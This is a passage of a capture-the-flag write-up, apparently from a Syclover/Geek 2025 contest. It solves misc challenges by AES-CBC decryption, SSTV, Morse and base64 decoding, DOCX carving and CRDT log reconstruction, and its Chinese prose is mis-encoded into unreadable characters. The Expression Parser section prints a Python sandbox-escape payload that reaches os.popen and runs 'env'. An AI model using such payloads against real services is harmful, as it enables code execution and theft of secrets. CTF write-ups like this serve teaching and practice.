class="number">0x0E</span>, <span class="number">0x46</span>, <span class="number">0x3E</span>, <span class="number">0x9D</span>, <span class="number">0xCD</span>, <span class="number">0x47</span>, </span><br><span class="line">  <span class="number">0xDF</span>, <span class="number">0xAA</span>, <span class="number">0x97</span>, <span class="number">0x15</span>, <span class="number">0xE4</span>, <span class="number">0x38</span>, <span class="number">0x6B</span>, <span class="number">0x66</span>, <span class="number">0x04</span>, <span class="number">0xB6</span>, </span><br><span class="line">  <span class="number">0xEF</span>, <span class="number">0xA3</span>, <span class="number">0xB2</span>, <span class="number">0x6F</span>, <span class="number">0xFD</span>, <span class="number">0x7A</span>, <span class="number">0x0B</span>, <span class="number">0x9C</span>, <span class="number">0x77</span>, <span class="number">0x12</span>, </span><br><span class="line">  <span class="number">0x40</span>, <span class="number">0xEB</span>, <span class="number">0x94</span>, <span class="number">0xF8</span>, <span class="number">0x81</span>, <span class="number">0x3D</span>, <span class="number">0xD4</span>, <span class="number">0x3B</span>, <span class="number">0x78</span>, <span class="number">0x72</span>, </span><br><span class="line">  <span class="number">0xB5</span>, <span class="number">0x1C</span>, <span class="number">0xF0</span>, <span class="number">0x61</span>, <span class="number">0x2F</span>, <span class="number">0xE3</span>, <span class="number">0xC3</span>, <span class="number">0xD6</span>, <span class="number">0x31</span>, <span class="number">0xFC</span>, </span><br><span class="line">  <span class="number">0x4B</span>, <span class="number">0x84</span>, <span class="number">0x41</span>, <span class="number">0xF7</span>, <span class="number">0x3F</span>, <span class="number">0x6E</span>, <span class="number">0x5E</span>, <span class="number">0xC1</span>, <span class="number">0x07</span>, <span class="number">0xE7</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x33</span>, <span class="number">0xE2</span>, <span class="number">0x57</span>, <span class="number">0xA6</span>, <span class="number">0x68</span>, <span class="number">0xBD</span>, <span class="number">0x20</span>, <span class="number">0x2E</span>, <span class="number">0x30</span>, </span><br><span class="line">  <span class="number">0xCC</span>, <span class="number">0x6A</span>, <span class="number">0x2D</span>, <span class="number">0x43</span>, <span class="number">0x1B</span>, <span class="number">0xEC</span>, <span class="number">0xCB</span>, <span class="number">0xE9</span>, <span class="number">0xD2</span>, <span class="number">0x7F</span>, </span><br><span class="line">  <span class="number">0x23</span>, <span class="number">0x0C</span>, <span class="number">0x49</span>, <span class="number">0x11</span>, <span class="number">0x24</span>, <span class="number">0xF6</span>, <span class="number">0x8D</span>, <span class="number">0xC2</span>, <span class="number">0x48</span>, <span class="number">0x65</span>, </span><br><span class="line">  <span class="number">0x7B</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0x3C</span>, <span class="number">0xAD</span>, <span class="number">0x1D</span>, <span class="number">0x02</span>, <span class="number">0x70</span>, <span class="number">0xEA</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0xCA</span>, <span class="number">0x32</span>, <span class="number">0xA2</span>, <span class="number">0x71</span>, <span class="number">0xD3</span>, <span class="number">0x80</span>, <span class="number">0x28</span>, <span class="number">0xD7</span>, <span class="number">0x4C</span>, <span class="number">0x54</span>, </span><br><span class="line">  <span class="number">0x18</span>, <span class="number">0x8B</span>, <span class="number">0x42</span>, <span class="number">0x05</span>, <span class="number">0xA5</span>, <span class="number">0xF1</span>, <span class="number">0x8F</span>, <span class="number">0x79</span>, <span class="number">0x2C</span>, <span class="number">0x19</span>, </span><br><span class="line">  <span class="number">0x1A</span>, <span class="number">0x9A</span>, <span class="number">0x82</span>, <span class="number">0x2A</span>, <span class="number">0xA0</span>, <span class="number">0x99</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0xD0</span>, </span><br><span class="line">  <span class="number">0xCF</span>, <span class="number">0x1F</span>, <span class="number">0xBA</span>, <span class="number">0xF9</span>, <span class="number">0xDD</span>, <span class="number">0xB7</span>, <span class="number">0x93</span>, <span class="number">0x7D</span>, <span class="number">0xD9</span>, <span class="number">0x5A</span>, </span><br><span class="line">  <span class="number">0xB0</span>, <span class="number">0xDB</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0xC8</span>, <span class="number">0x09</span>, <span class="number">0x53</span>, <span class="number">0x9B</span>, <span class="number">0x45</span>, <span class="number">0xA4</span>, </span><br><span class="line">  <span class="number">0xEE</span>, <span class="number">0xE6</span>, <span class="number">0xBC</span>, <span class="number">0x7E</span>, <span class="number">0x62</span>, <span class="number">0xD8</span>, <span class="number">0xFA</span>, <span class="number">0xB4</span>, <span class="number">0xC7</span>, <span class="number">0x8C</span>, </span><br><span class="line">  <span class="number">0x86</span>, <span class="number">0xAC</span>, <span class="number">0x4D</span>, <span class="number">0xC9</span>, <span class="number">0x4A</span>, <span class="number">0x50</span>, <span class="number">0x5C</span>, <span class="number">0xD5</span>, <span class="number">0x8A</span>, <span class="number">0x6D</span>, </span><br><span class="line">  <span class="number">0xF3</span>, <span class="number">0xA9</span>, <span class="number">0xE0</span>, <span class="number">0x98</span>, <span class="number">0xFE</span>, <span class="number">0xCE</span>, <span class="number">0x91</span>, <span class="number">0x0A</span>, <span class="number">0xDA</span>, <span class="number">0x5F</span>, </span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0x74</span>, <span class="number">0x5D</span>, <span class="number">0x85</span>, <span class="number">0x51</span>, <span class="number">0x55</span>, <span class="number">0x17</span>, <span class="number">0x06</span>, <span class="number">0xBE</span>, <span class="number">0xA1</span>, </span><br><span class="line">  <span class="number">0x92</span>, <span class="number">0xA8</span>, <span class="number">0x03</span>, <span class="number">0xC0</span>, <span class="number">0x52</span>, <span class="number">0xDC</span>, <span class="number">0x39</span>, <span class="number">0x73</span>, <span class="number">0xFB</span>, <span class="number">0xF2</span>, </span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0x95</span>, <span class="number">0x59</span>, <span class="number">0x56</span>, <span class="number">0x2B</span>, <span class="number">0x14</span>, <span class="number">0x89</span>, <span class="number">0x87</span>, <span class="number">0x21</span>, <span class="number">0x35</span>, </span><br><span class="line">  <span class="number">0xF5</span>, <span class="number">0xD1</span>, <span class="number">0x44</span>, <span class="number">0x26</span>, <span class="number">0x76</span>, <span class="number">0xB1</span>, <span class="number">0xC6</span>, <span class="number">0xBB</span>, <span class="number">0x5B</span>, <span class="number">0x6C</span>, </span><br><span class="line">  <span class="number">0x1E</span>, <span class="number">0xE5</span>, <span class="number">0x37</span>, <span class="number">0x16</span>, <span class="number">0x88</span>, <span class="number">0x8E</span>, <span class="number">0x0F</span>, <span class="number">0xAE</span>, <span class="number">0x27</span>, <span class="number">0xED</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x96</span>, <span class="number">0x60</span>, <span class="number">0x58</span>, <span class="number">0x10</span>, <span class="number">0x69</span>, <span class="number">0x13</span>, <span class="number">0x3A</span>, <span class="number">0xC5</span>, <span class="number">0xF4</span>, </span><br><span class="line">  <span class="number">0x9E</span>, <span class="number">0x64</span>, <span class="number">0xE8</span>, <span class="number">0xDE</span>, <span class="number">0x75</span>, <span class="number">0x9F</span>, <span class="number">0xC4</span>, <span class="number">0x29</span>, <span class="number">0xAB</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0xB3</span>, <span class="number">0xBF</span>, <span class="number">0x83</span>, <span class="number">0x34</span>, <span class="number">0x0D</span>, <span class="number">0xB9</span>]</span><br><span class="line"></span><br><span class="line">inv_s_box = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(s_box):</span><br><span class="line">    inv_s_box[v] = i</span><br><span class="line"></span><br><span class="line">Rcon = [<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1B</span>, <span class="number">0x36</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># -----------------------------</span></span><br><span class="line"><span class="comment"># è¾…åŠ©å‡½æ•°</span></span><br><span class="line"><span class="comment"># -----------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_bytes</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(i ^ j <span class="keyword">for</span> i, j <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pkcs7_pad</span>(<span class="params">data, block_size=<span class="number">16</span></span>):</span><br><span class="line">    pad_len = block_size - (<span class="built_in">len</span>(data) % block_size)</span><br><span class="line">    <span class="keyword">return</span> data + <span class="built_in">bytes</span>([pad_len]) * pad_len</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pkcs7_unpad</span>(<span class="params">data</span>):</span><br><span class="line">    pad_len = data[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">1</span> &lt;= pad_len &lt;= <span class="number">16</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Invalid padding&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> data[-pad_len:] != <span class="built_in">bytes</span>([pad_len]) * pad_len:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Bad PKCS#7 padding&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data[:-pad_len]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_bytes</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> [s_box[b] <span class="keyword">for</span> b <span class="keyword">in</span> state]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_sub_bytes</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> [inv_s_box[b] <span class="keyword">for</span> b <span class="keyword">in</span> state]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_rows</span>(<span class="params">state</span>):</span><br><span class="line">    out = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            out[<span class="number">4</span>*c + r] = state[<span class="number">4</span>*((c + r) % <span class="number">4</span>) + r]</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_shift_rows</span>(<span class="params">state</span>):</span><br><span class="line">    out = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            out[<span class="number">4</span>*c + r] = state[<span class="number">4</span>*((c - r) % <span class="number">4</span>) + r]</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xtime</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">return</span> ((a &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x1B</span>) &amp; <span class="number">0xFF</span> <span class="keyword">if</span> (a &amp; <span class="number">0x80</span>) <span class="keyword">else</span> (a &lt;&lt; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mix_single_column</span>(<span class="params">col</span>):</span><br><span class="line">    t = col[<span class="number">0</span>] ^ col[<span class="number">1</span>] ^ col[<span class="number">2</span>] ^ col[<span class="number">3</span>]</span><br><span class="line">    u = col[<span class="number">0</span>]</span><br><span class="line">    col[<span class="number">0</span>] ^= t ^ xtime(col[<span class="number">0</span>] ^ col[<span class="number">1</span>])</span><br><span class="line">    col[<span class="number">1</span>] ^= t ^ xtime(col[<span class="number">1</span>] ^ col[<span class="number">2</span>])</span><br><span class="line">    col[<span class="number">2</span>] ^= t ^ xtime(col[<span class="number">2</span>] ^ col[<span class="number">3</span>])</span><br><span class="line">    col[<span class="number">3</span>] ^= t ^ xtime(col[<span class="number">3</span>] ^ u)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mix_columns</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        col = s[c*<span class="number">4</span>:(c+<span class="number">1</span>)*<span class="number">4</span>]</span><br><span class="line">        mix_single_column(col)</span><br><span class="line">        s[c*<span class="number">4</span>:(c+<span class="number">1</span>)*<span class="number">4</span>] = col</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv_mix_columns</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        col = s[c*<span class="number">4</span>:(c+<span class="number">1</span>)*<span class="number">4</span>]</span><br><span class="line">        u = xtime(xtime(col[<span class="number">0</span>] ^ col[<span class="number">2</span>]))</span><br><span class="line">        v = xtime(xtime(col[<span class="number">1</span>] ^ col[<span class="number">3</span>]))</span><br><span class="line">        col[<span class="number">0</span>] ^= u</span><br><span class="line">        col[<span class="number">1</span>] ^= v</span><br><span class="line">        col[<span class="number">2</span>] ^= u</span><br><span class="line">        col[<span class="number">3</span>] ^= v</span><br><span class="line">        mix_single_column(col)</span><br><span class="line">        s[c*<span class="number">4</span>:(c+<span class="number">1</span>)*<span class="number">4</span>] = col</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes2matrix</span>(<span class="params">b</span>):</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">list</span>(b[i:i+<span class="number">4</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b), <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix2bytes</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(<span class="built_in">sum</span>(m, []))</span><br><span class="line"></span><br><span class="line"><span class="comment"># -----------------------------</span></span><br><span class="line"><span class="comment"># Key Expansion</span></span><br><span class="line"><span class="comment"># -----------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_expansion</span>(<span class="params">key</span>):</span><br><span class="line">    Nk = <span class="built_in">len</span>(key) // <span class="number">4</span></span><br><span class="line">    Nr = Nk + <span class="number">6</span></span><br><span class="line">    w = [<span class="built_in">list</span>(key[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Nk)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Nk, <span class="number">4</span>*(Nr+<span class="number">1</span>)):</span><br><span class="line">        temp = w[i-<span class="number">1</span>][:]</span><br><span class="line">        <span class="keyword">if</span> i % Nk == <span class="number">0</span>:</span><br><span class="line">            temp = temp[<span class="number">1</span>:] + temp[:<span class="number">1</span>]</span><br><span class="line">            temp = [s_box[b] <span class="keyword">for</span> b <span class="keyword">in</span> temp]</span><br><span class="line">            temp[<span class="number">0</span>] ^= Rcon[(i//Nk)-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">elif</span> Nk &gt; <span class="number">6</span> <span class="keyword">and</span> i % Nk == <span class="number">4</span>:</span><br><span class="line">            temp = [s_box[b] <span class="keyword">for</span> b <span class="keyword">in</span> temp]</span><br><span class="line">        w.append([a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(w[i-Nk], temp)])</span><br><span class="line">    <span class="keyword">return</span> w</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_round_key</span>(<span class="params">s, w</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            s[<span class="number">4</span>*c + r] ^= w[c][r]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_block</span>(<span class="params">block, w</span>):</span><br><span class="line">    s = <span class="built_in">list</span>(block)</span><br><span class="line">    Nr = <span class="built_in">len</span>(w)//<span class="number">4</span> - <span class="number">1</span></span><br><span class="line">    s = add_round_key(s, w[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">for</span> rnd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, Nr):</span><br><span class="line">        s = sub_bytes(s)</span><br><span class="line">        s = shift_rows(s)</span><br><span class="line">        s = mix_columns(s)</span><br><span class="line">        s = add_round_key(s, w[<span class="number">4</span>*rnd:<span class="number">4</span>*(rnd+<span class="number">1</span>)])</span><br><span class="line">    s = sub_bytes(s)</span><br><span class="line">    s = shift_rows(s)</span><br><span class="line">    s = add_round_key(s, w[<span class="number">4</span>*Nr:<span class="number">4</span>*(Nr+<span class="number">1</span>)])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">block, w</span>):</span><br><span class="line">    s = <span class="built_in">list</span>(block)</span><br><span class="line">    Nr = <span class="built_in">len</span>(w)//<span class="number">4</span> - <span class="number">1</span></span><br><span class="line">    s = add_round_key(s, w[<span class="number">4</span>*Nr:<span class="number">4</span>*(Nr+<span class="number">1</span>)])</span><br><span class="line">    <span class="keyword">for</span> rnd <span class="keyword">in</span> <span class="built_in">range</span>(Nr-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        s = inv_shift_rows(s)</span><br><span class="line">        s = inv_sub_bytes(s)</span><br><span class="line">        s = add_round_key(s, w[<span class="number">4</span>*rnd:<span class="number">4</span>*(rnd+<span class="number">1</span>)])</span><br><span class="line">        s = inv_mix_columns(s)</span><br><span class="line">    s = inv_shift_rows(s)</span><br><span class="line">    s = inv_sub_bytes(s)</span><br><span class="line">    s = add_round_key(s, w[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># -----------------------------</span></span><br><span class="line"><span class="comment"># AES-CBC æ¨¡å¼å°è£…</span></span><br><span class="line"><span class="comment"># -----------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_cbc_encrypt</span>(<span class="params">plaintext: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span>, iv: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    w = key_expansion(key)</span><br><span class="line">    plaintext = pkcs7_pad(plaintext)</span><br><span class="line">    blocks = [plaintext[i:i+<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(plaintext), <span class="number">16</span>)]</span><br><span class="line">    enc = []</span><br><span class="line">    prev = iv</span><br><span class="line">    <span class="keyword">for</span> blk <span class="keyword">in</span> blocks:</span><br><span class="line">        xored = xor_bytes(blk, prev)</span><br><span class="line">        c = encrypt_block(xored, w)</span><br><span class="line">        enc.append(c)</span><br><span class="line">        prev = c</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span>.join(enc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_cbc_decrypt</span>(<span class="params">ciphertext: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span>, iv: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    w = key_expansion(key)</span><br><span class="line">    blocks = [ciphertext[i:i+<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), <span class="number">16</span>)]</span><br><span class="line">    dec = []</span><br><span class="line">    prev = iv</span><br><span class="line">    <span class="keyword">for</span> blk <span class="keyword">in</span> blocks:</span><br><span class="line">        p = decrypt_block(blk, w)</span><br><span class="line">        dec.append(xor_bytes(p, prev))</span><br><span class="line">        prev = blk</span><br><span class="line">    data = <span class="string">b&quot;&quot;</span>.join(dec)</span><br><span class="line">    <span class="comment"># return pkcs7_unpad(data)</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># -----------------------------</span></span><br><span class="line"><span class="comment"># æµ‹è¯•</span></span><br><span class="line"><span class="comment"># -----------------------------</span></span><br><span class="line">key = <span class="string">b&quot;Syclover2025Geek&quot;</span></span><br><span class="line">iv = <span class="string">b&quot;1145141145144332&quot;</span></span><br><span class="line"></span><br><span class="line">ct = <span class="built_in">bytes</span>([<span class="number">0xB2</span>, <span class="number">0xB3</span>, <span class="number">0xDC</span>, <span class="number">0xB9</span>, <span class="number">0xF8</span>, <span class="number">0xD6</span>, <span class="number">0x93</span>, <span class="number">0xFF</span>, <span class="number">0xB5</span>, <span class="number">0xA1</span>, <span class="number">0xCC</span>, <span class="number">0x2A</span>, <span class="number">0x6F</span>, <span class="number">0xDE</span>, <span class="number">0x27</span>, <span class="number">0x44</span>, <span class="number">0xAF</span>, <span class="number">0x21</span>, <span class="number">0x98</span>, <span class="number">0xDD</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x0D</span>, <span class="number">0x1C</span>, <span class="number">0x53</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x3E</span>, <span class="number">0x16</span>, <span class="number">0xAB</span>, <span class="number">0xDF</span>, <span class="number">0x13</span>])</span><br><span class="line"></span><br><span class="line">pt = aes_cbc_decrypt(ct, key, iv)</span><br><span class="line"><span class="built_in">print</span>(pt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;We_ve_Trapped_in_The_Sink\x07\x07\x07\x07\x07\x07\x07&#x27;</span></span><br></pre></td></tr></table></figure><p>è§£å‹1nn3r.wavï¼ŒSSTV</p><p><code>sstv -d Signal-2086-1-1/1nn3r.wav</code></p><p>å›¾ç‰‡äºŒç»´ç ï¼Œæ‰«ç ï¼š</p><p><code>https://wwnr.lanzoum.com/iIjAG39n7mlg</code></p><p>å¾—åˆ°secret.wavï¼Œæ‘©æ–¯å¯†ç ï¼š</p><p><code>morse2ascii.exe .\secret.wav</code></p><p>å¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">55  31  6c  44  65  7a  64  6f  4d  54  56  66  4d  56  4e  66  4e  46  38  35  63  6a  52  75  52  46  39  6a  4d  45  34  31  63  44  46  79  51  47  4e  5a  4c  6e  30  3d</span><br></pre></td></tr></table></figure><p>16è¿›åˆ¶è½¬å­—ç¬¦ï¼Œå†base64è§£ç ï¼š</p><p><code>SYC&#123;7h15_1S_4_9r4nD_c0N5p1r@cY.&#125;</code></p><p>â€‹</p><h3 id="Expression-Parser"><a href="#Expression-Parser" class="headerlink" title="Expression Parser"></a>Expression Parser</h3><blockquote><p>çœ‹èµ·æ¥åªèƒ½è§£æ Python è¡¨è¾¾å¼</p></blockquote><p>æ‰¾åˆ° <code>os._wrap_close</code>ï¼Œç„¶åå–åˆ° <code>os</code>ï¼Œrceã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[155].__init__.__globals__[&#x27;popen&#x27;](&#x27;env&#x27;).read()</span><br></pre></td></tr></table></figure><p><code>SYC&#123;decent_jail_breaker_019a3a5971d571f5b833a00998e6c396&#125;</code></p><p>â€‹</p><h3 id="hidden"><a href="#hidden" class="headerlink" title="hidden"></a>hidden</h3><blockquote><p>Samsaraï¼šwordçš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Ÿ<br>ï¼šå½é‡Œå’•å™œè¯´ä»€ä¹ˆå‘¢ä¸å¦‚å»æ•´ç‚¹è–¯æ¡</p></blockquote><p>ç¬¬ä¸€æ®µï¼Œword/document.xmlï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;adsad</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒæ®µï¼Œdoc/word.txtï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag2ï¼šMzYyZ2V5ZGd3dW5rZHdlZQ==</span><br></pre></td></tr></table></figure><p>base64è§£ï¼š<code>362geydgwunkdwee</code></p><p>ç¬¬ä¸‰æ®µï¼Œdoc/flag3.jpgï¼Œç¼ºå°‘æ–‡ä»¶å¤´ <code>FF D8 FF</code>ï¼Œè¡¥å……å¾—åˆ°ï¼š<code>sjdmd&#125;</code></p><p>åˆå¹¶flagï¼š<code>SYC&#123;adsad362geydgwunkdweesjdmd&#125;</code></p><p>â€‹</p><h3 id="CRDT"><a href="#CRDT" class="headerlink" title="CRDT"></a>CRDT</h3><blockquote><p>ä½ æ‰¾åˆ°äº†ä¸€ä»½ååŒç¼–è¾‘å™¨çš„æ“ä½œæ—¥å¿—ã€‚è¯·è¿˜åŸæ”¶æ•›åçš„æœ€ç»ˆæ–‡æ¡£</p></blockquote><p>ååŒç¼–è¾‘å™¨çš„æ“ä½œæ—¥å¿—ï¼ˆCRDT é£æ ¼ï¼‰ï¼Œæ–‡æ¡£æœ€ç»ˆé¡ºåºä¾èµ–æ¯ä¸ªæ’å…¥æ“ä½œçš„ parent å­—æ®µï¼Œå¹¶ä¸”è¦å¿½ç•¥å·²ç»è¢«åˆ é™¤çš„å…ƒç´ ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»æ–‡ä»¶è¯»å–æ—¥å¿—ï¼Œæˆ–è€…ç›´æ¥æŠŠæ—¥å¿—èµ‹å€¼ç»™ ops</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ops.json&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ops = json.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”¨å­—å…¸å­˜å‚¨æ¯ä¸ªèŠ‚ç‚¹çš„ä¿¡æ¯</span></span><br><span class="line">nodes = &#123;&#125;</span><br><span class="line">deleted = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…ˆå¤„ç†æ‰€æœ‰åˆ é™¤æ“ä½œ</span></span><br><span class="line"><span class="keyword">for</span> op <span class="keyword">in</span> ops:</span><br><span class="line">    <span class="keyword">if</span> op[<span class="string">&quot;op&quot;</span>] == <span class="string">&quot;del&quot;</span>:</span><br><span class="line">        deleted.add(op[<span class="string">&quot;id&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤„ç†æ’å…¥æ“ä½œ</span></span><br><span class="line"><span class="keyword">for</span> op <span class="keyword">in</span> ops:</span><br><span class="line">    <span class="keyword">if</span> op[<span class="string">&quot;op&quot;</span>] == <span class="string">&quot;ins&quot;</span>:</span><br><span class="line">        nodes[op[<span class="string">&quot;id&quot;</span>]] = &#123;</span><br><span class="line">            <span class="string">&quot;ch&quot;</span>: op[<span class="string">&quot;ch&quot;</span>],</span><br><span class="line">            <span class="string">&quot;parent&quot;</span>: op.get(<span class="string">&quot;parent&quot;</span>),</span><br><span class="line">            <span class="string">&quot;children&quot;</span>: []</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ„å»ºçˆ¶å­å…³ç³»</span></span><br><span class="line"><span class="keyword">for</span> node_id, node <span class="keyword">in</span> nodes.items():</span><br><span class="line">    parent_id = node[<span 